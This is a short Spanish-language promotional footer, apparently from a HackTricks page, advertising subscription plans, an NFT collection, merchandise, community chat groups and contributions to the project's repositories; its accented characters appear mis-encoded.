* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio hacktricks](https://github.com/carlospolop/hacktricks) y [repositorio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
